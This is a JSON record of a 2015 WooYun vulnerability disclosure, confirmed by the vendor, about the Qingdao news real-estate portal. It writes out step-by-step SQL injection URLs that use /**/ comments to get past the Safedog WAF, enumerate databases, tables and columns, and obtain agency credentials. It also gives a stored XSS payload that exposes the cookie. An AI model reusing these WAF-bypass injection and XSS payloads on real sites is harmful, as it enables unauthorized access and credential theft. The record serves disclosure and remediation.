{"id": 80476, "wybug_id": "wooyun-2015-0155816", "wybug_title": "青岛新闻网房产门户存在sql注入（安全狗可绕）附送一个中介管理后台存储xss", "wybug_corp": "qingdaonews.com", "wybug_author": "挚爱阳阳", "wybug_date": "2015-11-25 15:31", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述：  详细说明：  有狗就要尝试绕过无意中找到这么一个链接http://house.qingdaonews.com/news/pictjwap.asp?id=8106输入'报错。以为很简单。但是继续输入or 1=1 发现有狗。但是不能这么停下。   漏洞证明：  有狗就要尝试绕过\n\n过程就不详细阐述了，直接贴绕过的一步步的payload吧  估计也不是最新的安全狗吧 这里用/**/代替空格，master之类的在黑名单之内。http://house.qingdaonews.com/news/pictjwap.asp?id=8106/**/and/**/(select/**/@@version)=1\n\nhttp://house.qingdaonews.com/news/pictjwap.asp?id=8106/**/and/**/1=2/**/union/**/all/**/select/**/1,name,'2',4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,2,20,21/**/from/**/sys.databases21个字段够多的。现在就要找库了。看好了。\n\n继续寻找。http://house.qingdaonews.com/news/pictjwap.asp?id=8106/**/and/**/1=2/**/union/**/all/**/select/**/'1',(select/**/name/**/from/**/sys.tables/**/for/**/xml/**/path('dd')),'3','4','5','6','7',8,9,'10','11','12','13','14',15,16,17,18,19,20,21 所有的表都出来了。现在继续找可疑的表。找到了一个zj（理解为中介）http://house.qingdaonews.com/news/pictjwap.asp?id=8106/**/and/**/1=2/**/union/**/all/**/select/**/'1',(select/**/name/**/from/**/sys.columns/**/where/**/object_id='1874105717'/**/for/**/xml/**/path('dd')),'3','4','5','6','7',8,9,'10','11','12','13','14',15,16,17,18,19,20,21果然不出所料，应该有很多用户的表的。这里手工只找一下具有代表性的中介的表的内容。\n\n\n\n找到用户名和密码：很多啊中介\n\n\n\n找到中介的后台登进去\n\n附送一个存储的xss吧。 在系统功能->修改信息初 输入</textarea><script>alert(document.cookie)</script> 保存然后重新查看即可触发。\n\n\n\n   修复方案：  这个安全狗不是万能的。应该不是最新版。建议升级。还有应该加入防注入的程序。   版权声明：转载请注明来源 挚爱阳阳@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-11-26 10:03 厂商回复： 很重要，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}